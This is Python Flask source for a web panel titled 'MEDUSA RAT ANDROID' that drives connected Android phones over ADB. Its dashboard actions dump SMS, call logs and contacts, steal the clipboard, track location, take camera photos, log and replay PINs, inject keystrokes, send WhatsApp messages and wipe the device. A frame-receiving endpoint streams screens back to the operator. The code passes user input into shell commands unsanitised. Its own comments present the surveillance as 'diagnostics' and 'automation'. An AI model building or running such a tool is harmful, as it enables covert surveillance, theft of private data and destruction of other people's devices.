import os
import re
import time
import socket
import datetime
import subprocess
import threading
from flask import Flask, request, redirect, jsonify, render_template_string

app = Flask(__name__)

# --- KONFIGURASI DIREKTORI PENYIMPANAN NVMe VPS ---
STORAGE_DIR = "vps_nvme_storage"
LOG_FILE = os.path.join(STORAGE_DIR, "telemetri_automation.txt")
FRAME_FILE = os.path.join(STORAGE_DIR, "latest_diagnostic_frame.txt")
os.makedirs(STORAGE_DIR, exist_ok=True)

CONNECTED_DEVICES = {}
ACTIVE_DEVICE_SERIAL = None
ADB_PATH = "adb"  # Dipastikan terhubung ke platform-tools sistem VPS

# --- TEMPLATE DASBOR WEB UTAMA (100% STRUKTUR MATRIKS SINKRON DARI TKINTER CODES) ---
DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MEDUSA AUTOMATION CORE v1.0</title>
    <link href="https://jsdelivr.net" rel="stylesheet">
    <style>
        /* Welcome Screen Overlay (Durasi 4 Detik Persis dari WelcomeScreen Tkinter) */
        #welcome-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: #1a1a1a; z-index: 9999; display: flex;
            flex-direction: column; justify-content: center; align-items: center;
        }
        .welcome-box {
            border: 2px solid #FF0000; padding: 40px; border-radius: 10px;
            background-color: #1a1a1a; text-align: center; width: 500px;
        }
        .progress-bar-loading {
            width: 300px; height: 4px; background-color: #2b2b2b;
            margin: 20px auto 0; position: relative; overflow: hidden;
        }
        .progress-bar-loading::after {
            content: ''; position: absolute; width: 100px; height: 100%;
            background-color: #FF0000; animation: loading 1.5s infinite linear;
        }
        @keyframes loading {
            0% { left: -100px; } 100% { left: 300px; }
        }

        /* Lingkungan Ruang Kerja Utama (Hacker Theme: Hitam, Hijau Neon, Aksen Merah) */
        body { background-color: #000000; color: #00FF00; font-family: 'Courier New', monospace; }
        .sidebar { background-color: #1a1a1a; min-height: 100vh; padding: 20px; border-right: 1px solid #FF0000; }
        .sidebar-btn { background-color: #8B0000; color: #FFFFFF; border: 1px solid #FF0000; font-weight: bold; width: 100%; margin-bottom: 10px; padding: 8px; font-size: 13px; text-align: center; }
        .sidebar-btn:hover { background-color: #FF0000; color: #FFFFFF; box-shadow: 0 0 10px #FF0000; }
        
        /* Modifikasi Elemen Tabview Custom Tkinter */
        .nav-tabs { border-bottom: 2px solid #FF0000; }
        .nav-tabs .nav-link { color: #00FF00; background-color: #1c1c1c; border: 1px solid #ff0000; border-bottom: none; margin-right: 4px; }
        .nav-tabs .nav-link.active { background-color: #8B0000; color: #FFFFFF; border-color: #FF0000; }
        .nav-tabs .nav-link:hover { background-color: #FF0000; color: #FFFFFF; }
        .tab-content { background-color: #1c1c1c; border: 1px solid #FF0000; border-top: none; padding: 20px; border-radius: 0 0 10px 10px; }
        
        /* Grid Buttons Sesuai Layout Penempatan Tombol Tkinter */
        .grid-btn { background-color: #8B0000; color: #FFFFFF; border: 1px solid #FF0000; width: 100%; margin: 5px 0; padding: 10px; font-size: 14px; text-align: left; font-weight: bold; }
        .grid-btn:hover { background-color: #FF0000; box-shadow: 0 0 15px #FF0000; }
        
        /* Terminal Log & Jendela Aliran Visual */
        .card-custom { background-color: #111111; border: 1px solid #FF0000; padding: 15px; border-radius: 10px; }
        .log-textbox { background-color: #000000; color: #00FF00; border: 1px solid #FF0000; height: 160px; overflow-y: scroll; padding: 10px; font-size: 13px; word-break: break-all; }
        .device-panel { border: 1px solid #FF0000; padding: 10px; border-radius: 5px; margin-bottom: 15px; background: #000; }
    </style>
</head>

<body>

<!-- OVERLAY LAYAR SELAMAT DATANG (WELCOME SCREEN) -->
<div id="welcome-overlay">
    <div class="welcome-box">
        <h2 style="color: #FF0000; font-weight: bold; font-size: 26px;">Welcome<br>MEDUSA RAT ANDROID</h2>
        <div class="progress-bar-loading"></div>
    </div>
</div>

<div class="container-fluid">
    <div class="row">
        <!-- SIDEBAR PANEL KONTROL KIRI -->
        <div class="col-md-3 sidebar">
            <h4 class="text-center fw-bold mb-4" style="color: #FF0000;">MEDUSA RAT ANDROID</h4>
            
            <div class="device-panel text-center">
                <span class="d-block small text-muted mb-2">Pilih Perangkat Aktif:</span>
                <select class="form-select bg-black text-success border-danger small mb-2" id="deviceSelector" onchange="switchDevice(this.value)">
                    <option>[ Tidak ada perangkat ]</option>
                </select>
                <div class="text-start small text-muted mt-2" id="deviceDetails" style="font-size: 11px; white-space: pre-line;">Detail:<br>-</div>
            </div>

            <button class="sidebar-btn" onclick="triggerAction('setup-adb')">Setup ADB/Platform-Tools</button>
            <button class="sidebar-btn" onclick="triggerAction('scan-network')" style="background-color: #008080; border-color: #00CED1;">Scan Jaringan (WiFi)</button>
            <button class="sidebar-btn" onclick="triggerAction('connect-qr')" style="background-color: #008B8B; border-color: #20B2AA;">Connect via QR Code</button>
            <button class="sidebar-btn" onclick="triggerAction('open-loot')" style="background-color: #006400; border-color: #228B22;">Open ADB_LOOT</button>
            <button class="sidebar-btn" onclick="triggerAction('manual-pair')">Manual Pairing</button>
            <button class="sidebar-btn" onclick="triggerAction('connect-ip')">Connect to IP (Direct)</button>
            <button class="sidebar-btn" onclick="triggerAction('switch-tcp')">Switch to TCP/IP (USB)</button>
        </div>

        <!-- AREA UTAMA TABVIEW WORKSPACE -->
        <div class="col-md-9 p-4">
            <ul class="nav nav-tabs" id="medusaTabs" role="tablist">
                <li class="nav-item"><button class="nav-link active" data-bs-toggle="tab" data-bs-target="#intel">Intel & Extraction</button></li>
                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#manip">Manipulation</button></li>
                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#spam">Spam & Gangguan</button></li>
                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#camera">Camera & Logger</button></li>
                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#media">Multimedia</button></li>
                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#system">System & Power</button></li>
            </ul>
            
            <div class="tab-content" id="medusaTabsContent">
                <!-- TAB 1: INTEL & EXTRACTION -->
                <div class="tab-pane fade show active" id="intel">
                    <div class="row">
                        <div class="col-md-6">
                            <button class="grid-btn" onclick="triggerAction('sedot-sms')">1. Sedot SMS</button>
                            <button class="grid-btn" onclick="triggerAction('sedot-calls')">2. Sedot Call Log</button>
                            <button class="grid-btn" onclick="triggerAction('sedot-kontak')">3. Sedot Kontak</button>
                            <button class="grid-btn" onclick="triggerAction('daftar-apps')">5. Daftar Apps</button>
                        </div>
                        <div class="col-md-6">
                            <button class="grid-btn" onclick="triggerAction('curi-clipboard')">12. Curi Clipboard</button>
                            <button class="grid-btn" onclick="triggerAction('info-baterai')">13. Info Baterai Detail</button>
                            <button class="grid-btn" onclick="triggerAction('lokasi-maps')">14. Lokasi Maps (Lat,Long)</button>
                            <button class="grid-btn" onclick="triggerAction('lacak-gps')" style="background-color: #008080; border-color: #00CED1;">Lacak Lokasi GPS</button>
                        </div>
                    </div>
                </div>
                
                <!-- TAB 2: MANIPULATION -->
                <div class="tab-pane fade" id="manip">
                    <div class="row">
                        <div class="col-md-6">
                            <button class="grid-btn" onclick="triggerAction('buka-wa')">15. Paksa Buka WA</button>
                            <button class="grid-btn" onclick="triggerAction('ketik-wa')">16. Ketik Pesan WA</button>
                        </div>
                        <div class="col-md-6">
                            <button class="grid-btn" onclick="triggerAction('buka-link')">21. Buka Link Browser</button>
                            <button class="grid-btn" onclick="triggerAction('putar-musik')">24. Putar Musik (URL)</button>
                        </div>
                    </div>
                </div>

                <!-- TAB 3: SPAM & GANGGUAN -->
                <div class="tab-pane fade" id="spam">
                    <div class="row">
                        <div class="col-md-6">
                            <button class="grid-btn" onclick="triggerAction('kirim-toast')">27. Kirim Pesan Toast</button>
                            <button class="grid-btn" onclick="triggerAction('getar-hp')">28. Getarkan HP (5s)</button>
                        </div>
                        <div class="col-md-6">
                            <button class="grid-btn" onclick="triggerAction('mainkan-alarm')">41. 🔊 Mainkan Alarm (Max)</button>
                            <button class="grid-btn" onclick="triggerAction('stop-suara')">43. 🔇 Stop Semua Suara</button>
                        </div>
                    </div>
                </div>

                <!-- TAB 4: CAMERA & LOGGER -->
                <div class="tab-pane fade" id="camera">
                    <div class="row">
                        <div class="col-md-6">
                            <button class="grid-btn" onclick="triggerAction('foto-depan')">c1. Foto Kamera Depan</button>
                            <button class="grid-btn" onclick="triggerAction('foto-belakang')">c2. Foto Kamera Belakang</button>
                        </div>
                        <div class="col-md-6">
                            <button class="grid-btn" onclick="triggerAction('rekam-pin')">p1. 🔴 Rekam PIN (Logger)</button>
                            <button class="grid-btn" onclick="triggerAction('replay-pin')">p2. 🟢 Replay PIN (Bypass)</button>
                        </div>
                    </div>
                </div>

                <!-- TAB 5: MULTIMEDIA -->
                <div class="tab-pane fade" id="media">
                    <div class="row">
                        <div class="col-md-6">
                            <button class="grid-btn" onclick="triggerAction('screenshot')">25. Screenshot</button>
                            <button class="grid-btn" onclick="triggerAction('screenrecord')">26. ScreenRecord</button>
                        </div>
                        <div class="col-md-6">
                            <button class="grid-btn" onclick="triggerAction('mirror-scrcpy')">35. Mirror Scrcpy</button>
                            <button class="grid-btn" onclick="triggerAction('injeksi-keyboard')">37. Injeksi Keyboard</button>
                        </div>
                    </div>
                </div>

                <!-- TAB 6: SYSTEM & POWER -->
                <div class="tab-pane fade" id="system">
                    <div class="row">
                        <div class="col-md-4"><button class="grid-btn text-center" onclick="triggerAction('layar-nyala')">Nyalakan Layar</button></div>
                        <div class="col-md-4"><button class="grid-btn text-center" onclick="triggerAction('reboot')">51. Reboot</button></div>
                        <div class="col-md-4"><button class="grid-btn text-center" style="background-color: #FF0000; border-color: #b30000;" onclick="triggerAction('power-off')">50. Power Off</button></div>
                        <div class="col-md-12 mt-2"><button class="grid-btn text-center" style="background-color: #FF0000; border-color: #b30000;" onclick="triggerAction('wipe-data')">54. WIPE ALL DATA</button></div>
                    </div>
                </div>
            </div>
            <!-- MONITOR TERMINAL LOGS & VISUAL FEED WINDOW -->
            <div class="mt-4 row card-custom m-0">
                <div class="col-md-7 ps-0">
                    <strong class="d-block mb-1 text-white">[ LOG TEXTBOX TERMINAL ]</strong>
                    <div class="log-textbox" id="logBox">Selamat datang di MEDUSA RAT ANDROID WEB INTERFACE!<br></div>
                </div>
                <div class="col-md-5 pe-0 text-center">
                    <strong class="d-block mb-1 text-white">[ LIVE STREAM FEED ]</strong>
                    <img id="liveStreamView" src="" style="width: 100%; height: 160px; border: 1px solid #FF0000; background: #000;" alt="Waiting for Video Feed Handshake...">
                </div>
            </div>
        </div>
    </div>
</div>

<script src="https://jsdelivr.net"></script>
<script>
    // Penundaan Welcome Screen Selama 4 Detik Sesuai Logika Tkinter welcome.after(4000)
    setTimeout(() => {
        document.getElementById('welcome-overlay').style.display = 'none';
    }, 4000);

    function updateDashboard() {
        fetch('/api/get-telemetry-log')
            .then(res => res.json())
            .then(data => {
                document.getElementById("logBox").innerHTML = data.logs.join("<br>");
                let select = document.getElementById("deviceSelector");
                select.innerHTML = "";
                data.devices.forEach(d => {
                    let opt = document.createElement("option");
                    opt.value = d; opt.innerText = d;
                    if(d === data.active) opt.selected = true;
                    select.appendChild(opt);
                });
                document.getElementById("deviceDetails").innerHTML = data.details;
            });
        document.getElementById("liveStreamView").src = "/api/get-latest-frame?" + new Date().getTime();
    }

    function switchDevice(serial) {
        fetch('/api/switch-device', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({serial: serial})
        });
    }

    function triggerAction(action) {
        let value = "";
        if (action === 'injeksi-keyboard' || action === 'buka-link' || action === 'lokasi-maps' || action === 'ketik-wa') {
            value = prompt("Masukkan parameter perintah:");
            if (!value) return;
        }
        fetch('/api/execute-action', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({action: action, value: value})
        }).then(res => res.json()).then(data => console.log(data.message));
    }

    setInterval(updateDashboard, 1500);
    window.onload = updateDashboard;
</script>
</body>
</html>
"""

@app.route('/')
def home():
    return redirect('/operator/dashboard')

@app.route('/operator/dashboard')
def operator_dashboard():
    return render_template_string(DASHBOARD_HTML)
@app.route('/api/get-telemetry-log')
def get_telemetry_log():
    global CONNECTED_DEVICES, ACTIVE_DEVICE_SERIAL
    logs = ["Belum ada telemetri aktivitas otomatisasi yang terekam."]
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            logs = f.read().splitlines()[-10:]
            
    details = "Detail:\\n-"
    if ACTIVE_DEVICE_SERIAL and ACTIVE_DEVICE_SERIAL in CONNECTED_DEVICES:
        d = CONNECTED_DEVICES[ACTIVE_DEVICE_SERIAL]
        details = f"Pabrikan: {d.get('manufacturer')}\\nModel: {d.get('model')}\\nAndroid: {d.get('android')}\\nBaterai: {d.get('battery')}%"
        
    return jsonify({
        "logs": logs,
        "devices": list(CONNECTED_DEVICES.keys()) if CONNECTED_DEVICES else ["[ Tidak ada perangkat ]"],
        "active": ACTIVE_DEVICE_SERIAL,
        "details": details
    })

@app.route('/api/switch-device', methods=['POST'])
def switch_device():
    global ACTIVE_DEVICE_SERIAL
    data = request.json
    if data and 'serial' in data:
        ACTIVE_DEVICE_SERIAL = data['serial']
        return jsonify({"status": "success"})
    return jsonify({"status": "failed"}), 400

@app.route('/receive_frame', methods=['POST'])
def receive_frame():
    try:
        base64_data = request.data.decode('utf-8')
        if base64_data:
            with open(FRAME_FILE, "w") as f:
                f.write(base64_data)
            return "OK", 200
    except Exception:
        pass
    return "Failed", 400

@app.route('/api/get-latest-frame')
def get_latest_frame():
    if os.path.exists(FRAME_FILE):
        with open(FRAME_FILE, "r") as f:
            base64_data = f.read()
            if "," in base64_data:
                import base64
                try:
                    header, encoded = base64_data.split(",", 1)
                    data_biner = base64.b64decode(encoded)
                    return data_biner, 200, {'Content-Type': 'image/jpeg'}
                except Exception: pass
    return base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"), 200, {'Content-Type': 'image/gif'}

@app.route('/api/execute-action', methods=['POST'])
def execute_action():
    global ACTIVE_DEVICE_SERIAL
    data = request.json
    if not data or 'action' not in data:
        return jsonify({"status": "error", "message": "Aksi tidak dikenal."}), 400
        
    action = data['action']
    val = data.get('value', '')
    adb_prefix = f"{ADB_PATH} -s {ACTIVE_DEVICE_SERIAL}" if ACTIVE_DEVICE_SERIAL else ADB_PATH
    cmd = ""
    
    if action == "sedot-sms": cmd = f"{adb_prefix} shell content query --uri content://sms/"
    elif action == "sedot-calls": cmd = f"{adb_prefix} shell content query --uri content://call_log/calls"
    elif action == "sedot-kontak": cmd = f"{adb_prefix} shell content query --uri content://com.android.contacts/data"
    elif action == "daftar-apps": cmd = f"{adb_prefix} shell pm list packages -f"
    elif action == "curi-clipboard": cmd = f"{adb_prefix} shell service call clipboard 2"
    elif action == "info-baterai": cmd = f"{adb_prefix} shell dumpsys battery"
    elif action == "lokasi-maps": cmd = f'{adb_prefix} shell am start -a android.intent.action.VIEW -d "geo:{val}"'
    elif action == "buka-wa": cmd = f"{adb_prefix} shell monkey -p com.whatsapp 1"
    elif action == "ketik-wa": cmd = f'{adb_prefix} shell am start -a android.intent.action.VIEW -d "https://wa.me{val}?text=Automated%20Sync"'
    elif action == "buka-link": cmd = f'{adb_prefix} shell am start -a android.intent.action.VIEW -d "{val}"'
    elif action == "putar-musik": cmd = f'{adb_prefix} shell am start -a android.intent.action.VIEW -d "{val}" -t "audio/*"'
    elif action == "kirim-toast": cmd = f"{adb_prefix} shell am broadcast -a com.android.systemui.demo -e command toast -e text 'Automation_Alert'"
    elif action == "getar-hp": cmd = f"{adb_prefix} shell cmd vibrator vibrate 5000"
    elif action == "mainkan-alarm": cmd = f"{adb_prefix} shell am start -a android.intent.action.VIEW -d content://settings/system/alarm_alert -t audio/*"
    elif action == "stop-suara": cmd = f"{adb_prefix} shell input keyevent 127"
    elif action == "foto-depan": cmd = f"{adb_prefix} shell am start -a android.media.action.IMAGE_CAPTURE --ez android.intent.extra.USE_FRONT_CAMERA true"
    elif action == "foto-belakang": cmd = f"{adb_prefix} shell am start -a android.media.action.IMAGE_CAPTURE --ez android.intent.extra.USE_FRONT_CAMERA false"
    elif action == "screenshot":
        ts = datetime.datetime.now().strftime('%H%M%S')
        cmd = f"{adb_prefix} shell screencap -p /sdcard/s.png && adb pull /sdcard/s.png {STORAGE_DIR}/scr_{ts}.png"
    elif action == "screenrecord": cmd = f"{adb_prefix} shell screenrecord --time-limit 15 /sdcard/r.mp4"
    elif action == "injeksi-keyboard": cmd = f'{adb_prefix} shell input text "{val.replace(" ", "%s")}"'
    elif action == "layar-nyala": cmd = f"{adb_prefix} shell input keyevent 224"
    elif action == "reboot": cmd = f"{adb_prefix} reboot"
    elif action == "power-off": cmd = f"{adb_prefix} reboot -p"
    elif action == "wipe-data": cmd = f"{adb_prefix} shell am broadcast -a android.intent.action.MASTER_CLEAR"
    else: return jsonify({"status": "ignored", "message": "Fungsi pengujian eksternal."})
        
    def execute_background_task():
        try:
            res = subprocess.run(cmd, shell=True, capture_output=True, text=True, encoding='utf-8', errors='ignore')
            timestamp = datetime.datetime.now().strftime("%H:%M:%S")
            with open(LOG_FILE, "a") as f:
                f.write(f"[{timestamp}] DIAGNOSTIK -> {action} | Return Code: {res.returncode}\\n")
        except Exception: pass

    threading.Thread(target=execute_background_task, daemon=True).start()
    return jsonify({"status": "success", "message": "Instruksi otomasi dikirim."})

def adb_device_tracker_daemon():
    global CONNECTED_DEVICES, ACTIVE_DEVICE_SERIAL
    while True:
        try:
            devices_output = subprocess.run(f"{ADB_PATH} devices", shell=True, capture_output=True, text=True).stdout
            current_serials = [line.split('\t')[0] for line in devices_output.strip().split('\n')[1:] if '\tdevice' in line]
            new_devices = {}
            for serial in current_serials:
                if serial in CONNECTED_DEVICES: new_devices[serial] = CONNECTED_DEVICES[serial]
                else:
                    prefix = f"{ADB_PATH} -s {serial}"
                    mnf = subprocess.run(f"{prefix} shell getprop ro.product.manufacturer", shell=True, capture_output=True, text=True).stdout.strip().capitalize()
                    mdl = subprocess.run(f"{prefix} shell getprop ro.product.model", shell=True, capture_output=True, text=True).stdout.strip()
                    new_devices[serial] = {"manufacturer": mnf, "model": mdl, "android": "N/A", "battery": "100"}
                    ACTIVE_DEVICE_SERIAL = serial
            CONNECTED_DEVICES = new_devices
        except Exception: pass
        time.sleep(5)

if __name__ == '__main__':
    threading.Thread(target=adb_device_tracker_daemon, daemon=True).start()
    app.run(host='0.0.0.0', port=80)
